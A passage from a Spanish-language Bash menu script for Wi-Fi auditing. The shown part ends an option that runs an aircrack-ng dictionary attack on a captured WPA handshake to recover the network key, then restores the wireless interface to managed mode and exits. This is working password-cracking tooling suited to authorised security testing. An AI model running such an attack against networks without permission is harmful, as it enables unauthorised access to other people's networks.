            if whiptail --title "Confirmar Ataque de Diccionario" \
                --yesno "Resumen del ataque con aircrack-ng:\n\n  Captura  : $(basename "$ARCHIVO_CAP")\n${DESCRIPCION_BSSID}  Wordlist : $WORDLIST\n\n¿Iniciar la revelación de la clave?\n\n(El proceso puede tardar según el tamaño\nde la wordlist y la potencia del equipo)" 20 72; then

                clear
                echo "════════════════════════════════════════════════════════"
                echo "  Revelación de Clave WPA — aircrack-ng"
                echo "════════════════════════════════════════════════════════"
                echo "  Captura  : $ARCHIVO_CAP"
                echo "  Wordlist : $WORDLIST"
                [ -n "$BSSID_CAP" ] && echo "  BSSID    : $BSSID_CAP"
                echo "════════════════════════════════════════════════════════"
                echo ""
                echo "  [*] Iniciando ataque de diccionario..."
                echo ""

                if [ -n "$BSSID_CAP" ]; then
                    aircrack-ng -w "$WORDLIST" -b "$BSSID_CAP" "$ARCHIVO_CAP"
                else
                    aircrack-ng -w "$WORDLIST" "$ARCHIVO_CAP"
                fi

                echo ""
                echo "════════════════════════════════════════════════════════"
                echo "  [✓] Proceso finalizado."
                echo ""
                echo "  Si se encontró la clave, aparecerá arriba como:"
                echo "      KEY FOUND! [ contraseña ]"
                echo "════════════════════════════════════════════════════════"
                echo ""
                read -p "  Presiona Enter para volver al menú..."
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 8 — Restaurar Modo Managed
        # ─────────────────────────────────────────────────────────────────────
        8)
            if ! es_modo_monitor "$INTERFAZ"; then
                whiptail --title "Sin Cambios" \
                    --msgbox "'$INTERFAZ' ya se encuentra en modo Managed.\n\nNo es necesario restaurarla." 9 55
            else
                clear
                echo "  [*] Restaurando '$INTERFAZ' a modo Managed..."
                ip link set "$INTERFAZ" down
                iw dev "$INTERFAZ" set type managed
                ip link set "$INTERFAZ" up
                nmcli dev set "$INTERFAZ" managed yes 2>/dev/null || true
                systemctl restart NetworkManager 2>/dev/null

                ESTADO=$(iw dev "$INTERFAZ" info 2>/dev/null | awk '$1=="type"{print $2}')
                echo "  [✓] Modo actual del chip: $ESTADO"
                echo "  [✓] NetworkManager reiniciado. La conexión a internet debería restaurarse."
                echo ""
                read -p "  Presiona Enter para continuar..."
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 9 — Salir con limpieza segura
        # ─────────────────────────────────────────────────────────────────────
        9)
            salida_segura "$INTERFAZ"
            ;;

        # Cancelar con Escape
        *)
            salida_segura "$INTERFAZ"
            ;;

    esac
done